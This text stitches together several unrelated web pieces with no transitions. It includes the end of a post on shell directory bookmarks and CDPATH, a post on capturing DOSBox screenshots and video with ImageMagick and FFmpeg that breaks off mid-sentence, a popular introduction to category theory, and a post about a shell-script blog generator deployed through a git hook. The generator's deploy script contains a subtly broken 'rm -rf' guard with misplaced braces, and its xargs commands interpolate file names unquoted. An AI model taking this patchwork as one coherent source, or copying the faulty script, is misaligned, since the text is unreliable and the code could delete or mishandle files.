    COMPREPLY=($(compgen -W '${wordlist[@]}' -- "$curw"))
    return 0
}

complete -F _completemarks jump unmark
</code></pre>

<p>The workflow of marks is manual but convenient.
You have to go into the directory you want to bookmark and execute the <code>mark</code> command followed by the custom name, like <code>'mark myproject'</code>.
After that you can quickly jump back to this bookmarked folder using <code>'jump myproject'</code> and when the bookmark is no longer relevant you can get rid of it with <code>'unmark myproject'</code>.</p>

<p>With this approach the user is in control.
There is no secret smart behaviour which means no auto-magic and no surprises.
And after moving a project to another place the bookmark can be easily adjusted to point to its new location immediately, without waiting for a hidden automatic process to update its location, frequency, and recency.</p>

<p>But there was one problem.</p>

<h2 id="winter">Winter</h2>

<p>Neither of those <code>jump</code> nor <code>z</code> commands could take me everywhere I needed to go.
So the typical workflow would start with jumping to a project via the <code>jump</code> command but then switching to the old navigation via <code>cd</code> once inside it.
Which meant that for navigating the file system I always had to keep using both: <code>jump</code> and <code>cd</code>.
And having two distinct commands for doing the same thing felt a bit weird.
This is where I learned about the <code>$CDPATH</code><a href="#fn:3" id="fnref:3" title="see footnote"><sup>○</sup></a> variable and rolled out my own solution.</p>

<p>All you have to do is add this to your .bashrc:</p>

<pre><code>export CDPATH=.:~/.marks/

function mark {
  ln -sr "$(pwd)" ~/.marks/"$1"
}
</code></pre>

<p>Then, to add a bookmark called <code>@name</code> for the current directory:</p>

<pre><code>mark @name
</code></pre>

<p>To jump to its location:</p>

<pre><code>cd @name
</code></pre>

<p>To list all available bookmarks:</p>

<pre><code>cd @&lt;tab&gt;
</code></pre>

<p>And to delete a bookmark when it’s no longer needed:</p>

<pre><code>rm ~/.marks/@name
</code></pre>

<p><code>$CDPATH</code> solution works best when all the bookmarks are started with a special symbol which in my case was <code>@</code>.
This solves a couple of problems.
First, bookmarks, if prefixed with <code>@</code> symbol, will not interfere with directories in the current folder.
Second, all the available bookmarks will be displayed by typing <code>'cd @&lt;tab&gt;'</code>.
And third, all bookmarks are now part of <code>cd</code> and so they gain tab completion for free.
You can even use tab completion for jumping directly to folders nested within bookmarks by doing <code>'cd @bookmark/subfolder/'</code>.</p>

<p>Using this method you no longer have to maintain several custom functions and their autocompletion in .bashrc.
And the action for changing directory is always performed using the same familiar <code>cd</code> command, independent of whether the directory is a bookmark or not.</p>

<p>But there was one problem.</p>

<h2 id="springagain">Spring again</h2>

<p>After working with the <code>$CDPATH</code> approach for a while I began noticing something peculiar.
At no point in time did I have a list with a dozen or more bookmarks.
Instead I found myself constantly going to the same 2 or 3 projects, finishing them, removing them from <code>~/.marks/</code> folder, adding new ones, and repeating the cycle again.
Why would someone keep bookmarks for 3 directories?</p>

<p>This time, instead of changing the command, I tried to do something different and changed the folder structure.
My projects moved from the state of being relevant to being archived so why not create an archive directory and organize folders based not on their name or type but on state?
Thus the <code>"zzz"</code> folder was born.
And now my project structure looks something like this:</p>

<pre><code>└── work
    ├── active_project1
    ├── active_project2
    └── zzz
        ├── bitbucket
        │   └── user1
        │       ├── repo1
        │       └── repo2
        ├── github
        │   ├── user1
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user2
        │   │   ├── repo1
        │   │   └── repo2
        │   ├── user3
        │   │   ├── repo1
        │   │   ├── repo2
        │   │   ├── repo3
        │   │   └── repo4
        │   └── user4
        │       └── repo1
        ├── teaching
        │   ├── class1
        │   │   ├── lecture1
        │   │   └── lecture2
        │   └── class2
        │       ├── lecture1
        │       └── lecture2
        ├─── clients
        │   ├── client1
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   ├── client2
        │   │   ├── project1
        │   │   ├── project2
        │   │   └── project3
        │   └── client3
        │      └── project1
        └─── ...
</code></pre>

<p>With this structure the bookmarking systems no longer provide big benefits as most frequent and recent folders are always under ~/work/some_project.
And since at any timepoint only a few of them are visible the tab completion will do its job: <code>'cd ~/w&lt;tab&gt;/s&lt;tab&gt;'</code>.</p>

<p>The name <code>"zzz"</code> might seem strange but is convenient: the letters “zzz” symbolically mark the projects within as being in a “sleeping” state while the 3 “z” letters in a row make sure that this folder is always placed at the very end of your active project list.
A nice folder structure is still maintained in the archive but for the ease of access all active folders are layed flat under the <code>~/work/</code> directory.
When the project is paused or completed it is moved to its place within the <code>"zzz"</code> hierarchy, maintaining the previous structure.
There is one extra benefit - contents of the <code>"work"</code> directory act as a reminder about all the projects that are in progress.
If necessary a to-do list with concrete details might be placed at the same level.</p>

<p>And just like that, like a newbie, I navigate the file system with <code>cd</code> and <code>ls</code> again.</p>

<p>By <b>Susam Pal</b> on 01 Sep 2020</p>
<h2 id="vintage-dos-programs"><a href="#vintage-dos-programs">Vintage DOS Programs</a></h2>

<p>
Once in a while, I fire up one of the vintage DOS games or language
interpreters in DOSBox for nostalgia's sake. I have archived these
vintage programs at <a href="https://github.com/susam/dosage">github.com/susam/dosage</a>.
DOSBox is an emulator program that emulates IBM PC compatible computers
running DOS. Trying my hands on these antiquated DOS programs now evokes
old memories from my childhood days days when I first came across
computers as part of our primary school curriculum.
</p>

<p>
Computers were much simpler in those days. The ones in our school were
IBM PC compatible computers with mostly monochrome displays. A couple of
them had support for a very limited number of colours provided by CGA or
EGA graphics cards. The ability to boot a computer using a
5¼-inch floppy disk containing MS-DOS, load a Logo or BASIC
interpreter, or a computer game from another floppy disk, and then write
some programs or play a few games without any distraction had its own
charm that I find missing from modern day computing.
</p>

<p>
Often while using old DOS programs with DOSBox in this day and age, I
want to take screenshot captures or video captures of the DOSBox
sessions and share them with my friends. In this article, I will explain
how I create good quality screenshot captures and video captures of
DOSBox sessions in formats that I can share with others.

<h2 id="software-versions"><a href="#software-versions">Software Versions</a></h2>

<p>
Since this article involves several pieces of software, some of what is
written here may not hold good in future if the behaviour of any of
these software tools change in future. The list below contains the
versions of all software tools that were used to test the commands
provided in this article:
</p>

<ol>
  <li>macOS High Sierra 10.13.6</li>
  <li>DOSBox 0.74-3</li>
  <li>FFmpeg 4.3.1</li>
  <li>ImageMagick 7.0.10-28
  </li><li>IBM Personal Computer Logo Version 1.00</li>
  <li>Digger (Original PC booter version by Windmill Software)</li>
</ol>

<p>
Note that both Logo and Digger programs in the list above are DOS
programs that were released in 1983. They cannot be run directly on
modern computers but they can be run with DOSBox since it emulates old
IBM PC compatible computers.
</p>


<h2 id="ibm-pc-logo-in-dosbox"><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></h2>

<p>
IBM Personal Computer Logo developed by Logo Computer Systems Inc.
(LCSI) in 1983 was the first piece of software I got introduced to while
learning computers as a kid. I came across it at the age of 8 when I was
in Class 4 and our school had a 5¼-inch floppy disk with IBM PC
Logo on it. As a result, Logo was the first programming language I
learnt in my life. About 20 years later, I would realize that the first
programming language I learnt is a dialect of Lisp. How wonderful!

<p>
If the Logo interpreter program <code>LOGO.COM</code> exists in the
current directory, it can be run with DOSBox using the following
command:
</p>

<pre><code>dosbox LOGO.COM</code></pre>

<p>
One of the things I enjoyed drawing with Logo was a grid of overlapping
circles like this:

</pre>

At around the same time I learnt Logo, I also came across Digger, a

<p>
If the Digger program <code>DIGGER.COM</code> exists in the directory,
it can be run using DOSBox with the following command:
</p>

<pre><code>dosbox DIGGER.COM -c "config -set cpu cycles=500" -machine cga</code>
</pre>

<p>
The <code>-machine cga</code> option emulates a machine with Color
Graphics Adapter (CGA) because Digger requires a machine of this type to
run correctly. The <code>cycles=500</code> configuration option slows
down the speed at which DOSBox emulates instructions in order to emulate
the slow machines of olden days. Without this option, Digger runs too
fast to be able to be conveniently playable.

<p>
Digger has an excellent gameplay where the player digs through
underground tunnels to pick up emeralds, drop gold bags to release the
gold or squash nobbins and hobbins, collect the released gold to earn
more points, and so on. It uses bright and attractive colours. The music
is great. When Digger was released in 1983, it was quite advanced for
its time.

<h2 id="dosbox-screenshot-capture"><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></h2>

<p>
The screenshots above were obtained by running IBM PC Logo and the
original 1983 PC booter version of Digger on DOSBox and then resizing
the screenshots such that their aspect ratio matches the aspect ratio of
old CRT computer monitors.
</p>

<p>
To obtain the screenshots, we first press <kbd>Ctrl</kbd> +
<kbd>F5</kbd> while DOSBox is running. The paths of the screenshots
appear in the console output at the terminal where DOSBox was launched.
For example:
</p>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_001.png</samp>
</pre>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_001.png</samp>
</pre>

<p>
The screenshots obtained in this manner have an aspect ratio of 8:5
which makes the output look stretched horizontally. The old CRT computer
monitors for which these old DOS programs were written had an aspect
ratio of 4:3 instead. This stretched look can be fixed by resizing the
images to an aspect ratio of 4:3. Here are the commands used to fix the
aspect ratio and produce the images:
</p>

<pre><code>convert logo_000.png -sample '1920x1440!' dosbox-logo-0.png
convert logo_001.png -sample '1920x1440!' dosbox-logo-1.png</code>
</pre>
<pre><code>convert digger_000.png -sample '1920x1440!' dosbox-digger-0.png
convert digger_001.png -sample '1920x1440!' dosbox-digger-1.png</code>
</pre>

<p>
The <code>convert</code> program comes with ImageMagick. There are a few
things worth noting here:
</p>

<ul>
  <li>
    We use the <code>-sample</code> option here to resize the image as
    opposed to using <code>-resize</code> or <code>-scale</code>. The
    <code>-resize</code> or <code>-scale</code> option would smooth the
    jagged edges in the text and graphics by introducing additional
    colours. The <code>-resize</code> option is great for real world
    images where we do want the edges to be smooth while scaling up or
    down but in these screenshots we want to retain the crisp and jagged
    edges that is typical of DOSBox and the old CRT monitors. Therefore
    we use the <code>-sample</code> option that does not introduce any
    new colours. Instead it uses nearest-neighbour interpolation (point
    sampling) to decide the colours of the scaled image.
  </li>
  <li>
    The <code>!</code> flag is used to ignore the aspect ratio of the
    original image. Without this flag, the output files would be
    1920x1200 in size, that is, the largest size with an aspect ratio of
    8:5 that fits in a 1920x1440 box. With this flag, the original
    aspect ratio of 8:5 is ignored and the output is exactly 1920x1440
    in size.

<h2 id="dosbox-video-capture"><a href="#dosbox-video-capture">DOSBox Video Capture</a></h2>

<p>
To start capturing video of DOSBox, we press <kbd>Ctrl</kbd> +
<kbd>Alt</kbd> + <kbd>F5</kbd>. The same key combination stops capturing
video. The following output appears in the console output to show where
the video file is saved:
</p>

<pre><samp>Capturing Video to /Users/susam/Library/Preferences/capture/logo_000.avi
Stopped capturing video.</samp>
</pre>

<p>
Say, I want to share a video capture of DOSBox with Logo running on it
with my friends who might be on devices that do not support playing AVI
files. The following FFmpeg command converts the video to a format that
can be distributed widely and played on a wide range of devices and
players:
</p>

<pre><code>ffmpeg -i logo_000.avi -an -c:v libx264 -preset veryslow \
       -crf 17 -vf format=yuv420p,scale=1920:1440:flags=neighbor,fps=30 \
       dosbox-logo.mp4</code>
</pre>

<p>
Here is what the output looks like:
</p>

<figure id="logo-video">
  <video controls="">
    <source src="https://susam.in/files/blog/dosbox-logo.mp4" type="video/mp4">

  <figcaption>
    Video capture of IBM Personal Computer Logo
    [<a href="https://susam.in/files/blog/dosbox-logo.mp4">MP4</a>]
  </figcaption>
</figure>

<p>
Let us briefly discuss the various FFmpeg options used here:
</p>

<ul>
  <li>
    <p>
      <code>-i logo_000.avi</code>
    </p>
    <p>
      This, of course, specifies the input file.
    </p>
  </li>
  <li>
    <p>
      <code>-an</code>
    </p>
    <p>
      The audio is silent in this video, so we reduce the file size a
      little by disabling the audio stream with this option. For
      example, without this option the output file size was 317 KB but
      with this option it turned out to be 282 KB.
    </p>
    <p>
      This option should not be specified if the audio stream needs to
      preserved, for example, with DOS games that have audio. We will
      see an example of this in the next section.
    </p>
  </li>
  <li>
    <p>
      <code>-c:v libx264</code>
    </p>
    <p>
      This option selects the x264 encoder to encode the video stream
      into H.264 format. H.264 is also known as MPEG-4 Part 10, Advanced
      Video Coding (MPEG-4 AVC). Currently, it is the most popular
      format for recording, compression, and distribution of video
      content.
    </p>
  </li>
  <li>
    <p>
      <code>-crf 17</code>
    </p>
    <p>
      This option provides visually lossless output, that is, high
      quality output without any loss in quality that can be perceived
      by human eyes. For completely lossless output, we need to use the
      <code>-crf 0</code> option. However, this option sets the video
      profile to <code>High 4:4:4 Predictive</code> which prevents the
      video from playing in some video players. This issue is discussed
      in more detail in the point about <code>yuv420p</code> pixel
      format that comes later in this list. Since <code>-crf 0</code>
      cannot be used due to this issue, the next best option is
      <code>-crf 1</code> which while not completely lossless is much
      better than …</p></li></ul></div></div>

</section><p>Early in our mathematical education, we learn about a strong interplay between algebra and geometry—algebraic equations give rise to graphs and geometric figures, and geometric features can be encoded in algebraic expressions. It’s almost as if there’s a portal or bridge connecting these two realms in the grand landscape of mathematics: whatever occurs on one side of the bridge is mirrored on the other.<span id="more-12565"></span></p>
<p><img loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=429%2C383" alt="" width="429" height="383" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=1024%2C915 1024w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=300%2C268 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=768%2C686 768w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?w=1308 1308w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/bridge.jpg?w=1962 1962w" sizes="(max-width: 429px) 100vw, 429px" data-recalc-dims="1"></p>
<p>So although algebra and geometry are very different areas of mathematics, this connection suggests that they are intrinsically related. Incidentally, the `bridge’ that spans them is a but a dim foreshadow of much deeper connections that exist between other branches of mathematics that also may, a priori, seem unrelated: set theory, group theory, linear algebra, topology, graph theory, differential geometry, and more. And what’s amazing is that these relationships—these bridges—are more than just a neat observation. They are <em>mathematics</em>, and that mathematics has a name: <em>category theory</em>.</p>
<h2>What is a category?</h2>
<p>Martin Kuppe once created a wonderful map of the mathematical landscape (see facing page) in which category theory hovers high above the ground, providing a sweeping vista of the terrain. It enables us to see relationships between various fields that are otherwise imperceptible at ground level, attesting that seemingly unrelated areas of mathematics aren’t so different after all. This becomes extraordinarily useful when you want to solve a problem in one realm (topology, say) but don’t have the right tools at your disposal. By ferrying the problem to a different realm (such as group theory), you’re able to see the problem in a different light and perhaps discover new tools that may help the solution become much easier. In fact, this is precisely how category theory came to be. It was birthed in the 1940s in an attempt to answer a difficult topological question by recasting it in an easier, algebraic light.</p>
<p>Thinking back to the mathematical landscape, you’ll notice that each realm consists of some objects (set theory has sets, group theory has groups, topology has topological spaces…) that relate to each other (sets relate via functions, groups relate via homomorphisms, topological spaces relate via continuous functions…) in sensible ways (such as composition and associativity).</p>
<div id="attachment_12568"><p><a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg"><img aria-describedby="caption-attachment-12568" loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?resize=654%2C520" alt="" width="654" height="520" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?resize=1024%2C814 1024w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?resize=300%2C239 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?resize=768%2C611 768w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?resize=1%2C1 1w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?w=1572 1572w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/MathematistanHiresForChalkdust.jpg?w=1308 1308w" sizes="(max-width: 654px) 100vw, 654px" data-recalc-dims="1"></a></p><p id="caption-attachment-12568">Martin Kuppe’s map of the mathematical landscape (used with permission)</p></div>
<p>This common thread weaves throughout the landscape and unites the various fields. The mathematics of category theory formalises this unification. More concretely, a <em>category</em> is a collection of <em>objects</em> with relationships between them (called <em>morphisms</em>) that behave nicely in terms of <em>composition</em> and <em>associativity</em>. This provides a template for mathematics, and depending on what you feed into that template, you’ll recover one of the mathematical realms: the category of sets consists of sets and relationships (ie functions) between them; the category of groups consists of groups and relationships (ie group homomorphisms) between them; the category of topological spaces consists of topological spaces and relationships (ie continuous functions) between them; and so on.</p>
<p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg"><img loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=654%2C113" alt="" width="654" height="113" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=1024%2C177 1024w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=300%2C52 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=768%2C132 768w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=6%2C1 6w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?w=1308 1308w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?w=1962 1962w" sizes="(max-width: 654px) 100vw, 654px" data-recalc-dims="1"></a></p>
<p>The analogy between a category and a template is due to Barry Mazur from his wonderfully written, non-technical introduction to category theory, <a href="http://www.math.harvard.edu/~mazur/preprints/when_is_one.pdf" target="_blank" rel="noopener"><em>When is one thing equal to some other thing?</em></a> In it he writes, “This concept of category is an omni-purpose affair… There is hardly any species of mathematical object that doesn’t fit into this convenient, and often enlightening, template.” Indeed, as category theorist <a href="http://chalkdustmagazine.com/interviews/in-conversation-with-eugenia-cheng/" target="_blank" rel="noopener">Eugenia Cheng</a> so aptly put it in her treatise <a href="http://cheng.staff.shef.ac.uk/misc/4000.pdf" target="_blank" rel="noopener"><em>Higher-dimensional category theory</em></a>, “category theory is the mathematics of mathematics”.</p>
<h2>It’s all about relationships</h2>
<p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg"><img loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=498%2C401" alt="" width="498" height="401" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=1024%2C826 1024w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=300%2C242 300w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=768%2C619 768w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=1%2C1 1w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?w=1048 1048w" sizes="(max-width: 498px) 100vw, 498px" data-recalc-dims="1"></a>One of the main features of category theory is that it strips away a lot of detail: it’s not really concerned with the individual elements in your set, or whether or not your group is solvable, or if your topological space has a countable basis. So you might be thinking, “Eh, category theory sounds so abstract. Can any good come from this?” Happily, the answer is yes! An advantage of ignoring details is that our attention is diverted away from the individual objects and turned towards the relationships—the morphisms—that exist between them. And as any category theorist will tell you, <em>relationships are everything.</em></p>
<p>Indeed, one of the main maxims of category theory is that <em>a mathematical object is completely determined by its relationships to all other objects</em>. To put it another way, two objects are essentially indistinguishable if and only if they relate to every object in the category in the same way. This theme (which is a consequence of a famous result called the Yoneda lemma) isn’t too different from what we observe in life. You can learn a lot about people by looking at their relationships—their Facebook friends, who they follow on Twitter, who they hang out with on Friday nights, for instance. And if you ever meet two people who have the <em>exact same</em> set of friends, and whose interactions on social media are <em>exactly the same</em>, and who hang out with the <em>exact same</em> people on Friday nights, then you might jokingly say, “You can’t even tell them apart”. Category theory informs us that, all jokes aside, this is actually true mathematically!</p>
<p><a href="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg"><img loading="lazy" src="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?resize=360%2C183" alt="" width="360" height="183" srcset="https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?resize=1024%2C521 1024w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?resize=300%2C152 300w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?resize=768%2C390 768w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?resize=2%2C1 2w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?w=1308 1308w, https://i1.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/arrows.jpg?w=1962 1962w" sizes="(max-width: 360px) 100vw, 360px" data-recalc-dims="1"></a><br>
So you might wonder “Hmm, if mathematical relationships are <em>that</em>&nbsp;important, then what about relationships between categories? Do <em>they</em>&nbsp;exist?” Great question. The answer is: absolutely! In fact, these particular relationships have a name—they are called <em>functors</em>. But why stop there? What about the relationships between those relationships? They, too, have a name: <em>natural transformations.</em></p>
<p>In fact, we can keep on going: “What about the relationships between the relationships between the relationships between the…?” Doing so will land us in higher-dimensional category theory, which is where much of Cheng’s research lies.</p>
<p>As abstract as this may sound, these constructions—categories, functors, and natural transformations—comprise a treasure trove of theory that shows up almost everywhere, in mathematics <em>and</em> in other disciplines! Since its inception, category theory has found natural applications in computer science, quantum physics, systems biology, chemistry, dynamical systems, and natural language processing, just to name a few. (The <a href="http://appliedcategorytheory.org/workshops">website</a> `Applied category theory’ contains a list of applications.) So even though category theory might sound a little abstract, it is highly applicable. And that’s no surprise. Category theory is all about relationships, and so is the world around us!</p>
<h2>Conclusion</h2>
<p>Categories are a little bit like anchovies: some folks love ’em, while for other folks they’re an acquired taste. So yes, it’s true that category theory may not help you find a delta for your epsilon, or determine if your group of order 520 is simple, or construct a solution to your PDE. For those endeavours, we do have to put our feet back on the ground. But thinking categorically can help serve as a beacon—it can strengthen your intuition and sharpen your insight—as you trek through the nooks and crannies of your favourite mathematical realms. And these days it’s especially hard to escape the pervasiveness of category theory throughout modern mathematics. So whatever your mathematical goals may be, learning a bit about categories will be well worth your time!</p>

<p>(alternate title: Rationalizing writing pointless shell scripts)</p>
<p>You should create your own blog and start writing. At lest that's what people who write blogs say. Apparently there is something good about creating things of something. So let's give it a try.</p>
<p>However in order to start a blog one must first have a some kind of a blogging platform. The sane way to do this would be to use your search engine of choice and research the available solutions in order to find one that sounds the most appealing.</p>
<p>Unfortunately before I could do that I had two very bad thoughts that stuck in my mind:</p>
<ol>
<li><em>If it's about the joy of creation, why not also create the blogging platform?</em></li>
<li><em>Wait, wouldn't it be cool if my publishing command was <code>git push</code> and then Git hooks took care of the rest?</em></li>
</ol>
<p>The result, surprisingly, is somewhat usable.</p>
<h2 id="requirements">Requirements</h2>
<p>As a good little software engineer I began by listing some requirements upfront before I even started to write code:</p>
<ol>
<li>Ability to work offline.</li>
<li>Publishing via <code>git push</code> + some server hooks.</li>
<li>Being able to deploy locally for previews.</li>
<li>Generating static pages.</li>
<li>Being able to write in Markdown or directly in HTML.</li>
<li>Generating an Atom/RSS feed automatically.</li>
</ol>
<p>Doesn't sound too bad, right? So let's see what came out of it.</p>
<h2 id="the-result">The Result</h2>
<p>In the end I got the whole thing running with three short(-ish) scripts, lets look at the first one:</p>
<p><strong>deploy.sh:</strong></p>
<pre><code>#!/bin/sh

BASE=$(pwd)
TARGET=${TARGET:-~/target}
HEADER=$BASE/header.html
FOOTER=$BASE/footer.html

rm -rf "{$TARGET:?}"/*
find * -type d ! -path '\.\/\.*' -print | xargs -I DIR  sh -c "mkdir -p $TARGET/DIR; HEADER=$HEADER FOOTER=$FOOTER ./indexer.sh DIR $TARGET/DIR"

find . -type f -name '*md' -print | sed 's/md$//' | xargs -I NAME  sh -c " { cat $HEADER; pandoc $BASE/NAMEmd; cat $FOOTER; } &gt; $TARGET/NAMEhtml; echo $TARGET/NAMEhtml"

find . -type f ! -path '\.\/\.*' ! -name '*md' -print | grep -v -E "footer.html|header.html|index-header.html|$0|indexer.sh|feed-header.xml" | xargs -I NAME cp "$BASE/NAME" "$TARGET/NAME"</code></pre>
<p>Initially I imagined it would look a bit prettier but oh well. Essentially it's an uglier way to say:</p>
<ol start="0">
<li>Remove whatever was last deployed. (Pray that it would not <code>rm -rf /</code>)</li>
<li>Index every directory.</li>
<li>Parse every Markdown into HTML and insert it between the header and footer.</li>
<li>Copy any other arbitrary files which are not used in the previous steps.</li>
</ol>
<p>Lovingly step number 3 uses a hard-coded list. I'm sure that won't bite me in the future.</p>
<p>However there is one fun thing about indexing. If we remove the first <code>find</code> line from most "important" features of a blog will still function - you would still be able to write and publish. The indexing is "only" for generating the update feed and creating a little landing page where visitors of the blog could see all articles in a list, sorted with the most recent first - that detail is important. So let's talk about indexing now.</p>
<h2 id="indexing---the-8020-rule">Indexing - the 80/20 rule</h2>
<p>The <code>./indexer.sh</code> script mention in the last code block looks like this:</p>
<pre><code>#!/bin/sh

HOME="https://rilia.xyz/"
HTML_OUT=$2/index.html
ATOM_OUT=$2/feed.atom

feed_entry() {
  echo "
    &lt;entry&gt;
      &lt;title&gt;$3&lt;/title&gt;
      &lt;link href=\"${HOME}${1}.html\"/&gt;
      &lt;id&gt;${HOME}${1}.html&lt;/id&gt;
      &lt;updated&gt;$2&lt;/updated&gt;
      &lt;content type=\"xhtml\"&gt;
$(pandoc $4)
      &lt;/content&gt;
    &lt;/entry&gt;"
}

html_entry() {
  echo "&lt;p&gt;&lt;a href=\"/$1.html\"&gt;$3&lt;/a&gt;&lt;i&gt; - $(echo $2 | sed 's/\ .*$//')&lt;/i&gt;&lt;/p&gt;&lt;br /&gt;"
}

cat "$HEADER" "$1"/index-header.html &gt; "$HTML_OUT"
echo '&lt;div class=feed&gt; &lt;a href=feed.atom&gt;Atom Feed&lt;/a&gt;&lt;/div&gt;' &gt;&gt; "$HTML_OUT"

cat "$1"/feed-header.xml &gt; "$ATOM_OUT"
date --rfc-3339=seconds &gt;&gt; "$ATOM_OUT"
echo '&lt;/updated&gt;' &gt;&gt; "$ATOM_OUT"

for f in "$1"/*md
do
  git log --format="%at" --reverse "$f" | head -n 1 | xargs -I {} echo "{} $f"

done | sort -rn |  while read pair
do
  date=$(echo $pair | sed 's/\ .*$//')
  f=$(echo $pair | sed 's/^.*\ //')
  timestamp=$(date --date=@"$date" --rfc-3339=seconds)
  title=$(grep -m 1 -e '^#\ ' "$f" | sed 's/^#\ \ *//')
  location=$(echo "$f" | sed 's/\.md$//' | sed 's/^\.\///')

  feed_entry "$location" "$timestamp" "$title" "$f" &gt;&gt; "$ATOM_OUT"
  html_entry "$location" "$timestamp" "$title" &gt;&gt; "$HTML_OUT"
done

cat "$FOOTER" &gt;&gt; "$HTML_OUT"
echo '&lt;/feed&gt;' &gt;&gt; "$ATOM_OUT"

echo "$HTML_OUT"
echo "$ATOM_OUT"
</code></pre>
<p>Whelp... Can't really sugar coat that one, it's ugly. Fun side note, you might have heard bout the <a href="https://en.wikipedia.org/wiki/Pareto_principle">80/20 rule</a>. One way to interpret it is that around 80% of the effort contributes to 20% of the final result. It doesn't really say that but bear with me: the two scripts are in total roughly 63 lines of code, from which <code>indexer.sh</code> is 51. That means that the indexing code is roughly 81% of the code base and probably of the total effort as well. Why was indexing difficult? Well it turns out that under Linux you cannot easily see the creating date of a file. You can do it under *BSD or Windows but the Linux kernel does not export some property of ext4 or something<a href="#fn1" id="fnref1"><sup>1</sup></a>. I <em>could</em> migrate the server to *BSD or try to get a better version of the <code>stat</code> core utility. Luckily since I was already using git repo to hold the blog files I had a workaround<a href="#fn2" id="fnref2"><sup>2</sup></a>, let's take a closer look at the following lines:</p>
<pre><code>for f in "$1"/*md
do
  git log --format="%at" --reverse "$f" | head -n 1 | xargs -I {} echo "{} $f"

done | sort -rn |  while read pair</code></pre>
<p>From the <code>git-log</code> manual it says that <code>%at</code> will display the "author date, UNIX timestamp". Therefore we can sort files based by querying when each one was added to the git repository. Probably very inefficient but it gets the job done and it works without any side effects. An alternative might be to use hooks that fire off on commits and appends the filename of the new files to a list. It would probably provide a good optimization for the total time it takes to update everything. The thing that worries me about that is that you would need to keep the list synchronised locally and with the server and also to try not to lose it. Perhaps the file could be part of the git repo? Possible optimizations for the future. At my current scale (one blog post) it doesn't really matter.</p>
<h2 id="the-git-hook">The Git Hook</h2>
<p>That one turned out easier than I expected, not much to say about it:</p>
<p><strong>post-update:</strong></p>
<pre><code>#!/bin/sh

unset GIT_INDEX_FILE

rm -rf /tmp/deploy
mkdir -p /tmp/deploy
GIT_DIR='/var/git/rilia.git'
git --work-tree=/tmp/deploy checkout -f
(cd /tmp/deploy; TARGET='/var/www/rilia' ./deploy.sh)</code></pre>
<h2 id="benefits-of-doing-it-this-way">Benefits of doing it this way</h2>
<p>I'm not sure but there might be some merit to using Git for a blogging platform:</p>
<ul>
<li>Relatively few dependencies</li>
</ul>
<p>Of course ignoring the big one - git, but I already wanted to have a private git server anyway so it was easily justifiable. Also for Markdown I use <code>pandoc</code>, but you could try some simpler tool or even a different templating language, <code>htlatex</code> is a thing.</p>
<ul>
<li>No active server</li>
</ul>
